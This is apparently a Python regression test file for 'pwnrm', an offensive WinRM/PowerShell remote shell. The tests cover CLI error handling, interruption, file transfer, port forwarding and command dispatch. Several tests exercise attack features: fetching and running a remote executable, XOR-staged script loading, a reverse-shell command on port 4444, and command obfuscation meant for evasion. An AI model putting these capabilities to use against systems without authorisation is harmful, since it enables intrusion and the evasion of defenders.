"""Regression tests for CLI, interruption, transfer, and shell runtime behavior."""

import hashlib
import io
import tempfile
import unittest
from pathlib import Path
from types import SimpleNamespace
from unittest.mock import MagicMock, patch

import pwnrm.cli as cli
from pwnrm.core.runspace import Runspace
from pwnrm.core.tunnel import PortForwarder
from pwnrm.shell.ctrlc import CtrlCHandler
from pwnrm.shell.pwnshell import PwnShell


class TestRuntimeCore(unittest.TestCase):
    def test_cli_returns_failure_for_transport_setup_error(self):
        parser = MagicMock()
        parser.parse_args.return_value = SimpleNamespace(ts=False, debug=False, timeout="30")
        with (
            patch("pwnrm.cli.argument_parser", return_value=parser),
            patch("pwnrm.cli.create_transport", side_effect=ValueError("bad auth")),
            patch("builtins.print"),
        ):
            self.assertEqual(cli.main(), 1)

    def test_cli_returns_failure_for_connection_error(self):
        parser = MagicMock()
        parser.parse_args.return_value = SimpleNamespace(
            ts=False, debug=False, timeout="30", target="host", username="user"
        )
        with (
            patch("pwnrm.cli.argument_parser", return_value=parser),
            patch("pwnrm.cli.create_transport", return_value=MagicMock()),
            patch("pwnrm.cli.Runspace", side_effect=RuntimeError("offline")),
            patch("builtins.print"),
        ):
            self.assertEqual(cli.main(), 1)

    def test_cli_single_command_returns_failure_for_remote_error(self):
        parser = MagicMock()
        parser.parse_args.return_value = SimpleNamespace(
            ts=False, debug=False, timeout=30, target="host", username="user", replay=None, X="bad"
        )
        shell = MagicMock()
        shell.repl.return_value = {"status": "error", "error": "remote failure"}
        shell.start_time = __import__("datetime").datetime.now()
        shell.cmd_count = 1
        with (
            patch("pwnrm.cli.argument_parser", return_value=parser),
            patch("pwnrm.cli.create_transport", return_value=MagicMock()),
            patch("pwnrm.cli.Runspace") as runspace_type,
            patch("pwnrm.cli.PwnShell", return_value=shell),
            patch("builtins.print"),
        ):
            runspace_type.return_value.__enter__.return_value = MagicMock()
            self.assertEqual(cli.main(), 1)

    def test_cli_replay_preserves_failure_exit_status(self):
        parser = MagicMock()
        parser.parse_args.return_value = SimpleNamespace(
            ts=False, debug=False, timeout=30, target="host", username="user",
            replay="transcript.log", X=None,
        )
        shell = MagicMock()
        shell.repl.side_effect = [{"status": "error", "error": "bad step"}, None]
        shell.start_time = __import__("datetime").datetime.now()
        shell.cmd_count = 1
        with (
            patch("pwnrm.cli.argument_parser", return_value=parser),
            patch("pwnrm.cli.create_transport", return_value=MagicMock()),
            patch("pwnrm.cli.Runspace") as runspace_type,
            patch("pwnrm.cli.PwnShell", return_value=shell),
            patch("pwnrm.cli.parse_replay_log", return_value=["bad"]),
            patch("builtins.print"),
        ):
            runspace_type.return_value.__enter__.return_value = MagicMock()
            self.assertEqual(cli.main(), 1)

    def test_cli_target_info_never_contains_target_password(self):
        parser = MagicMock()
        parser.parse_args.return_value = SimpleNamespace(
            ts=False, debug=False, timeout=30,
            target="CORP/user:TopSecret@dc01", username="", replay=None, X="whoami",
        )
        transport = MagicMock()
        transport.url = "http://dc01:5985/wsman"
        transport.creds = SimpleNamespace(domain="CORP", username="user")
        shell = MagicMock()
        shell.repl.return_value = {"status": "completed"}
        shell.start_time = __import__("datetime").datetime.now()
        shell.cmd_count = 1
        with (
            patch("pwnrm.cli.argument_parser", return_value=parser),
            patch("pwnrm.cli.create_transport", return_value=transport),
            patch("pwnrm.cli.Runspace") as runspace_type,
            patch("pwnrm.cli.PwnShell", return_value=shell) as shell_type,
            patch("builtins.print"),
        ):
            runspace_type.return_value.__enter__.return_value = MagicMock()
            self.assertEqual(cli.main(), 0)
        target_info = shell_type.call_args.kwargs["target_info"]
        self.assertEqual(target_info, {"host": "dc01", "user": "CORP\\user"})
        self.assertNotIn("TopSecret", repr(target_info))

    def test_display_host_handles_non_string_transport_url_safely(self):
        transport = MagicMock()
        args = SimpleNamespace(target="CORP/user:TopSecret@dc01")
        self.assertEqual(cli._display_host(transport, args), "dc01")
        self.assertNotIn("TopSecret", cli._display_host(transport, args))

    def test_runspace_interrupt_stops_active_pipeline(self):
        runspace = object.__new__(Runspace)
        runspace._active_ps = MagicMock()
        self.assertTrue(runspace.interrupt())
        runspace._active_ps.stop.assert_called_once_with()
        runspace._active_ps = None
        self.assertFalse(runspace.interrupt())

    def test_runspace_enter_closes_wsman_when_pool_open_fails(self):
        runspace = object.__new__(Runspace)
        runspace._wsman = MagicMock()
        runspace._pool = None
        runspace.shell_id = None
        with patch("pwnrm.core.runspace.RunspacePool") as pool_type:
            pool_type.return_value.open.side_effect = RuntimeError("open failed")
            with self.assertRaisesRegex(RuntimeError, "open failed"):
                runspace.__enter__()
        runspace._wsman.__enter__.assert_called_once_with()
        runspace._wsman.__exit__.assert_called_once()
        self.assertIsNone(runspace._pool)

    def test_runspace_uses_interruptible_async_pipeline(self):
        class Streams:
            error = []
            warning = []
            verbose = []
            information = []
            progress = []

        class FakePowerShell:
            def __init__(self, pool):
                self.id = "pipeline-id"
                self.state = 1
                self.output = []
                self.streams = Streams()
                self.begin_options = None

            def add_script(self, command):
                return self

            def add_cmdlet(self, command):
                return self

            def add_parameter(self, command):
                return self

            def begin_invoke(self, remote_stream_options):
                self.begin_options = remote_stream_options

            def poll_invoke(self, timeout):
                self.output.append("result")
                self.state = 4

        runspace = object.__new__(Runspace)
        runspace._pool = MagicMock()
        runspace._active_ps = None
        runspace.timeout = 30
        runspace.consecutive_timeouts = 0
        runspace.max_consecutive_timeouts = 3
        runspace.command_id = None
        with patch("pwnrm.core.runspace.PowerShell", FakePowerShell):
            events = list(runspace.run_command("whoami"))
        self.assertEqual(events, [{"stdout": "result\n"}])
        self.assertIsNone(runspace._active_ps)

    def test_ctrlc_handler_invokes_interrupt_callback(self):
        installed = {}

        def fake_signal(sig, handler):
            installed[sig] = handler

        callback = MagicMock()
        with (
            patch("pwnrm.shell.ctrlc.getsignal", return_value=object()),
            patch("pwnrm.shell.ctrlc.signal", side_effect=fake_signal),
        ):
            with CtrlCHandler(on_interrupt=callback):
                handler = next(value for value in installed.values() if callable(value))
                handler(None, None)
                handler(None, None)
        callback.assert_called_once_with()

    @staticmethod
    def _bare_shell():
        shell = object.__new__(PwnShell)
        shell.stdout_log = None
        shell.socks_server = None
        shell.write_info = MagicMock()
        shell.write_warning = MagicMock()
        shell.write_error = MagicMock()
        shell.write_progress = MagicMock()
        shell.write_line = MagicMock()
        return shell

    def test_directory_download_normalizes_boolean_output(self):
        shell = self._bare_shell()

        def run_sync(command, *args, **kwargs):
            if command.startswith("Resolve-Path"):
                return "C:\\Temp\\folder\n"
            if command.startswith("Test-Path"):
                return "True\n"
            if "GetTempPath" in command:
                return "C:\\Windows\\Temp\\\n"
            return ""

        shell.run_sync = MagicMock(side_effect=run_sync)
        shell.run_with_interrupt = MagicMock(return_value=False)
        with tempfile.TemporaryDirectory() as td:
            shell.download(f'C:\\Temp\\folder "{Path(td) / "folder.zip"}"')
        commands = [call.args[0] for call in shell.run_with_interrupt.call_args_list]
        self.assertTrue(any("CreateFromDirectory" in command for command in commands))

    def test_empty_file_upload_creates_remote_temp_file(self):
        shell = self._bare_shell()
        expected = hashlib.sha256(b"").hexdigest().upper()

        def run_sync(command, *args, **kwargs):
            if "GetTempPath" in command:
                return "C:\\Windows\\Temp\\\n"
            if "Get-FileHash" in command:
                return expected + "\n"
            return ""

        shell.run_sync = MagicMock(side_effect=run_sync)
        shell.run_with_interrupt = MagicMock(return_value=False)
        with tempfile.TemporaryDirectory() as td:
            empty = Path(td) / "empty.bin"
            empty.write_bytes(b"")
            shell.upload(str(empty))
        commands = [call.args[0] for call in shell.run_sync.call_args_list]
        self.assertTrue(any("WriteAllBytes" in command for command in commands))
        shell.write_error.assert_not_called()

    def test_netrun_restores_console_writers(self):
        shell = self._bare_shell()
        shell.run_with_interrupt = MagicMock(return_value=False)
        shell.netrun("https://example.invalid/tool.exe")
        commands = [call.args[0] for call in shell.run_with_interrupt.call_args_list]
        script = "\n".join(commands)
        self.assertIn("$oldOut = [Console]::Out", script)
        self.assertIn("$oldErr = [Console]::Error", script)
        self.assertIn("finally {", script)
        self.assertIn("[Console]::SetOut($oldOut)", script)
        self.assertIn("[Console]::SetError($oldErr)", script)
        self.assertNotIn("[Console]::SetOut([IO.StreamWriter]::Null)", script)

    def test_psrun_rejects_extra_args_and_reads_remote_xor_file(self):
        shell = self._bare_shell()
        shell.run_with_interrupt = MagicMock(return_value=False)
        result = shell.psrun("-xor C:\\Windows\\Temp\\stage.ps1")
        self.assertEqual(result["status"], "completed")
        script = shell.run_with_interrupt.call_args.args[0]
        self.assertIn("[IO.File]::ReadAllBytes('C:\\Windows\\Temp\\stage.ps1')", script)
        self.assertIn("[Array]::Clear($data", script)

        shell.run_with_interrupt.reset_mock()
        result = shell.psrun("https://example.test/a.ps1 ignored")
        self.assertEqual(result["status"], "error")
        shell.run_with_interrupt.assert_not_called()

    def test_revshell_rejects_ipv6_instead_of_truncating_address(self):
        shell = self._bare_shell()
        shell.run_with_interrupt = MagicMock(return_value=False)
        result = shell.revshell("2001:db8::1 4444")
        self.assertEqual(result["status"], "error")
        shell.run_with_interrupt.assert_not_called()

    def test_port_forward_dispatch_can_stop_all(self):
        shell = self._bare_shell()
        shell.port_forwarder = PortForwarder()
        shell.port_forwarder.start_local_forward(0, "127.0.0.1", 11082)
        shell._portfwd_dispatch("stop all")
        self.assertEqual(shell.port_forwarder.list_forwards(), [])

    def test_repl_requires_exact_builtin_command_name(self):
        shell = self._bare_shell()
        shell.update_cwd = MagicMock()
        shell.cmd_count = 0
        shell.opsec_profile = SimpleNamespace(jitter_sleep=MagicMock())
        shell.target_info = {}
        shell.module_mgr = MagicMock()
        shell.help = MagicMock()

        shell.repl(inputs=["!adcsfoo"])

        shell.help.assert_called_once_with()
        shell.module_mgr.get_module.assert_not_called()

    def test_repl_propagates_remote_module_error_records(self):
        shell = self._bare_shell()
        shell.update_cwd = MagicMock()
        shell.cmd_count = 0
        shell.last_run_errors = []
        shell.opsec_profile = SimpleNamespace(jitter_sleep=MagicMock())
        shell.target_info = {}
        module = MagicMock()

        def run_module(active_shell, args):
            active_shell.run_with_interrupt("bad-script", active_shell.write_line)
            return {"status": "completed"}

        module.run.side_effect = run_module
        shell.module_mgr = MagicMock()
        shell.module_mgr.get_module.return_value = module
        shell.runspace = MagicMock()
        shell.runspace.run_command.return_value = iter([{"error": "remote parse failure"}])

        result = shell.repl(inputs=["!adcs"])

        self.assertEqual(result["status"], "error")
        self.assertIn("remote parse failure", result["error"])

    def test_batch_repl_preserves_earlier_failure(self):
        shell = self._bare_shell()
        shell.update_cwd = MagicMock()
        shell.cmd_count = 0
        shell.last_run_errors = []
        shell.opsec_profile = SimpleNamespace(jitter_sleep=MagicMock())
        shell.target_info = {}
        shell._no_args_dispatch = PwnShell._no_args_dispatch.__get__(shell)
        shell.sysinfo = MagicMock(side_effect=[{"status": "error"}, {"status": "completed"}])
        shell.module_mgr = MagicMock()

        result = shell.repl(inputs=["!sysinfo", "!sysinfo"])

        self.assertEqual(result["status"], "error")

    def test_dispatchers_reject_unexpected_arguments(self):
        shell = self._bare_shell()
        shell.session_mgr = MagicMock()
        shell.port_forwarder = MagicMock()
        shell.module_mgr = MagicMock()
        shell.loot_mgr = MagicMock()
        shell.opsec_profile = SimpleNamespace(mode="balanced", set_mode=MagicMock())
        shell.sysinfo = MagicMock(return_value={"status": "completed"})
        shell._no_args_dispatch = PwnShell._no_args_dispatch.__get__(shell)

        self.assertEqual(shell._session_dispatch("list extra")["status"], "error")
        self.assertEqual(shell._portfwd_dispatch("list extra")["status"], "error")
        self.assertEqual(shell._module_dispatch("list extra")["status"], "error")
        self.assertEqual(shell._loot_dispatch("extra")["status"], "error")
        self.assertEqual(shell._opsec_dispatch("balanced extra")["status"], "error")
        self.assertEqual(shell._no_args_dispatch("extra", shell.sysinfo, "!sysinfo")["status"], "error")
        shell.sysinfo.assert_not_called()

    def test_repl_applies_active_profile_to_raw_commands(self):
        shell = self._bare_shell()
        shell.update_cwd = MagicMock()
        shell.cmd_count = 0
        shell.last_run_errors = []
        shell.target_info = {}
        shell.opsec_profile = SimpleNamespace(
            jitter_sleep=MagicMock(),
            obfuscate_cmd=MagicMock(return_value="G`et-Pr`ocess"),
        )
        shell.run_with_interrupt = MagicMock(return_value=False)
        shell.module_mgr = MagicMock()

        result = shell.repl(inputs=["Get-Process"])

        self.assertEqual(result["status"], "completed")
        shell.opsec_profile.obfuscate_cmd.assert_called_once_with("Get-Process")
        shell.run_with_interrupt.assert_called_once_with("G`et-Pr`ocess", shell.write_line)

    def test_transcript_records_sanitized_errors_and_warnings(self):
        shell = self._bare_shell()
        shell.need_clear = False
        shell.stdout_log = io.BytesIO()
        with patch("builtins.print"):
            PwnShell.write_line(shell, {"error": "bad\x1b[2J error"})
            PwnShell.write_line(shell, {"warn": "careful"})
        transcript = shell.stdout_log.getvalue().decode()
        self.assertIn("[ERROR] bad error", transcript)
        self.assertIn("[WARN] careful", transcript)
        self.assertNotIn("\x1b", transcript)


if __name__ == "__main__":
    unittest.main()
